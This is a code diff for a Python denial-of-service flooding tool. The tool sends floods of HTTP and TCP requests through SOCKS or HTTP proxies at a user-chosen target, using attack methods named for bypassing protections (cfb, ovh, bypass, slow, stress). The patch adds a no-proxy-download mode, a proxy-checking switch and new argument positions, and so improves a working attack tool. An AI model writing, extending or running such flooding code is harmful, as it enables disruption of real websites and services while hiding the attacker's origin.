@@ -453,7 +453,7 @@ def dyn(event, socks_type):
                 s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            if socks_type == 1:
+            if socks_type == 1 or socks_type==0:
                 s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((str(target), int(port)))
@@ -482,7 +482,7 @@ def http(event, socks_type):
                 s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            if socks_type == 1:
+            if socks_type == 1 or socks_type==0:
                 s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((str(target), int(port)))
@@ -510,7 +510,7 @@ def capb(event, socks_type):
                 s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            if socks_type == 1:
+            if socks_type == 1 or socks_type==0:
                 s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((str(target), int(port)))
@@ -538,7 +538,7 @@ def ovh(event, socks_type):
                 s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            if socks_type == 1:
+            if socks_type == 1 or socks_type==0:
                 s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((str(target), int(port)))
@@ -565,7 +565,7 @@ def pps(event, socks_type):
                 s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            if socks_type == 1:
+            if socks_type == 1 or socks_type==0:
                 s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((str(target), int(port)))
@@ -595,7 +595,7 @@ def even(event, socks_type):
                 s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            if socks_type == 1:
+            if socks_type == 1 or socks_type==0:
                 s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((str(target), int(port)))
@@ -625,7 +625,7 @@ def brust(event, socks_type):
                 s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            if socks_type == 1:
+            if socks_type == 1 or socks_type==0:
                 s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((str(target), int(port)))
@@ -654,7 +654,7 @@ def cookie(event, socks_type):
                 s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            if socks_type == 1:
+            if socks_type == 1 or socks_type==0:
                 s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((str(target), int(port)))
@@ -683,7 +683,7 @@ def cfb(event, socks_type):
                 s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            if socks_type == 1:
+            if socks_type == 1 or socks_type==0:
                 s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((str(target), int(port)))
@@ -717,14 +717,14 @@ def AVB(event, socks_type):
             if socks_type == 5 or socks_type == 4:
                 s.proxies['http'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
                 s.proxies['https'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
-            if socks_type == 1:
+            if socks_type == 1 or socks_type==0:
                 s.proxies['http'] = 'http://' + str(proxy[0]) + ":" + str(proxy[1])
                 s.proxies['https'] = 'https://' + str(proxy[0]) + ":" + str(proxy[1])
             if protocol == "https":
                 s.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
             try:
                 for _ in range(multiple):
-                    s.post(sys.argv[5], timeout=1, data=payload)
+                    s.post(sys.argv[6], timeout=1, data=payload)
             except:
                 s.close()
         except:
@@ -741,14 +741,14 @@ def bypass(event, socks_type):
             if socks_type == 5 or socks_type == 4:
                 s.proxies['http'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
                 s.proxies['https'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
-            if socks_type == 1:
+            if socks_type == 1 or socks_type==0:
                 s.proxies['http'] = 'http://' + str(proxy[0]) + ":" + str(proxy[1])
                 s.proxies['https'] = 'https://' + str(proxy[0]) + ":" + str(proxy[1])
             if protocol == "https":
                 s.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
             try:
                 for _ in range(multiple):
-                    s.post(sys.argv[5], timeout=1, data=payload)
+                    s.post(sys.argv[6], timeout=1, data=payload)
             except:
                 s.close()
         except:
@@ -764,7 +764,7 @@ def dgb(event, socks_type):
             if socks_type == 5 or socks_type == 4:
                 s.proxies['http'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
                 s.proxies['https'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
-            if socks_type == 1:
+            if socks_type == 1 or socks_type==0:
                 s.proxies['http'] = 'http://' + str(proxy[0]) + ":" + str(proxy[1])
                 s.proxies['https'] = 'https://' + str(proxy[0]) + ":" + str(proxy[1])
             if protocol == "https":
@@ -772,7 +772,7 @@ def dgb(event, socks_type):
             try:
                 sleep(5)
                 for _ in range(multiple):
-                    s.get(sys.argv[5])
+                    s.get(sys.argv[6])
             except:
                 s.close()
         except:
@@ -792,7 +792,7 @@ def head(event, socks_type):
                 s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            if socks_type == 1:
+            if socks_type == 1 or socks_type==0:
                 s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((str(target), int(port)))
@@ -821,7 +821,7 @@ def null(event, socks_type):
                 s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            if socks_type == 1:
+            if socks_type == 1 or socks_type==0:
                 s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((str(target), int(port)))
@@ -850,7 +850,7 @@ def gsb(event, socks_type):
                 s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            if socks_type == 1:
+            if socks_type == 1 or socks_type==0:
                 s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((str(target), int(port)))
@@ -894,7 +894,7 @@ def cfbc(event, socks_type):
                 s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            if socks_type == 1:
+            if socks_type == 1 or socks_type==0:
                 s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((str(target), int(port)))
@@ -921,7 +921,7 @@ def post(event, socks_type):
                 s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            if socks_type == 1:
+            if socks_type == 1 or socks_type==0:
                 s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((str(target), int(port)))
@@ -948,7 +948,7 @@ def stress(event, socks_type):
                 s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            if socks_type == 1:
+            if socks_type == 1 or socks_type==0:
                 s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((str(target), int(port)))
@@ -996,7 +996,7 @@ def slow(conn, socks_type):
                 s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            if socks_type == 1:
+            if socks_type == 1 or socks_type==0:
                 s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
             s.connect((str(target), int(port)))
             if protocol == "https":
@@ -1035,7 +1035,7 @@ def checking(lines, socks_type, ms):
                 s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            if socks_type == 1:
+            if socks_type == 1 or socks_type==0:
                 s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
             s.settimeout(ms)
             s.connect((str(target), int(port)))
@@ -1056,7 +1056,7 @@ def checking(lines, socks_type, ms):
 nums = 0
 
 
-def check_socks(ms):
+def go_check_socks(ms):
     global nums
     thread_list = []
     for lines in list(proxies):
@@ -1066,7 +1066,7 @@ def check_socks(ms):
         if choice == "4":
             th = threading.Thread(target=checking, args=(lines, 4, ms,))
             th.start()
-        if choice == "1":
+        if choice == "1" or choice=="0":
             th = threading.Thread(target=checking, args=(lines, 1, ms,))
             th.start()
         thread_list.append(th)
@@ -1233,7 +1233,7 @@ def downloadsocks(choice):
 
 
 def main():
-    global proxies, multiple, choice, timer, out_file
+    global proxies, multiple, choice, timer, out_file,check_socks
     method = str(sys.argv[1]).lower()
     
     out_file = str("proxy.txt")
@@ -1244,7 +1244,7 @@ def main():
         proxydl(out_file, socks_type)
         exit()
     if method == "stop":
-        url = str(sys.argv[5]).strip()
+        url = str(sys.argv[6]).strip()
         UrlFixer(url)
         stop()
     elif (method == "help") or (method == "h"):
@@ -1254,20 +1254,25 @@ def main():
     elif str(method.upper()) not in str(methods):
         print("method not found")
         exit()
-    timer = int(time.time()) + 1000000
-    url = str(sys.argv[5]).strip()
+    timer = int(time.time()) + 100000000
+    url = str(sys.argv[6]).strip()
     UrlFixer(url)
     choice = str(sys.argv[2]).strip()
-    if choice != "4" and choice != "5" and choice != "1":
-        print("Socks Type Not Found [4, 5, 1]")
+    if choice != "4" and choice != "5" and choice != "1" and choice!="0":
+        print("Socks Type Not Found [4, 5, 1, 0]")
         exit()
     if choice == "4":
         socks_type = 4
     elif choice == "1":
         socks_type = 1
+    elif choice == "0":
+        socks_type = 0
     else:
         socks_type = 5
-    threads = int(sys.argv[3])
+
+    check_socks=int(str(sys.argv[3]).strip())
+    
+    threads = int(sys.argv[4])
     proxies = open(out_file).readlines()
     if method == "slow":
         conn = threads
@@ -1277,7 +1282,7 @@ def main():
         for _ in range(conn):
             threading.Thread(target=slow, args=(conn, socks_type), daemon=True).start()
     else:
-        multiple = str((sys.argv[4]))
+        multiple = str((sys.argv[5]))
         if multiple == "":
             multiple = int(100)
         else:
@@ -1294,7 +1299,7 @@ def main():
 
 
 def proxydl(out_file, socks_type):
-    global proxies, multiple, choice, data
+    global proxies, multiple, choice, data,check_socks
     ms = 1
     if socks_type == 1:
         socktyper = "HTTP"
@@ -1303,11 +1308,13 @@ def proxydl(out_file, socks_type):
     if socks_type == 5:
         socktyper = "SOCKS5"
 
-    print("downloading {} proxy list...".format(socktyper))
-    downloadsocks(choice)
+    if socks_type !=0:
+        print("downloading {} proxy list...".format(socktyper))
+        downloadsocks(choice)
     proxies = open(str(out_file)).readlines()
     check_list(out_file)
-    check_socks(ms)
+    if check_socks==1:
+        go_check_socks(ms)
 
 
 bds = 0
@@ -1391,7 +1398,7 @@ def tools():
     try:
         tool = sys.argv[2].lower()
         if tool != "dstat":
-            domain = sys.argv[3]
+            domain = sys.argv[6]
             if str('.') not in str(domain):
                 print('address not found')
                 toolgui()
@@ -1456,7 +1463,7 @@ def piger(siye):
 
 def usgeaseets():
     global metho, url, thr, proxylist, muli, tim, l7s, l4s, tos, ots, l3s
-    socks = ["1", "4", "5"]
+    socks = ["0","1", "4", "5"]
 
 
     proxylist = "proxy.txt"
@@ -1474,18 +1481,18 @@ def usgeaseets():
     try:
         methos = metho.upper()
         if (methos in l4) or (methos in l3):
-            url = sys.argv[5]
-        elif str("http") not in sys.argv[5]:
+            url = sys.argv[6]
+        elif str("http") not in sys.argv[6]:
             url = "https://example.com"
-        elif sys.argv[5]:
-            url = sys.argv[5]
+        elif sys.argv[6]:
+            url = sys.argv[6]
         else:
             url = "https://example.com"
     except:
         url = "https://example.com"
     try:
-        if sys.argv[3]:
-            thr = sys.argv[3]
+        if sys.argv[4]:
+            thr = sys.argv[4]
         else:
             thr = Intn(100, 1000)
     except:
@@ -1500,8 +1507,8 @@ def usgeaseets():
         exit()
 
     try:
-        if sys.argv[4]:
-            muli = sys.argv[4]
+        if sys.argv[5]:
+            muli = sys.argv[5]
         else:
             muli = Intn(5, 100)
     except:
@@ -1518,7 +1525,7 @@ def usgeaseets():
 
 def usge():
     usgeaseets()
-    print('Usage:\n python3 {} <method> <socks_type:5/4/1> <threads> <multiple> <url>\n'.format(sys.argv[0]))
+    print('Usage:\n python3 {} <method> <socks_type:5/4/1/0> <check_socks:0/1> <threads> <multiple> <url>\n'.format(sys.argv[0]))
     print('Example:\n python3 {} {} {} {} {} {}\n'.format(sys.argv[0], metho,  sys.argv[2], thr, muli,url))
     print(' > Methods:')
     print(' - L3')
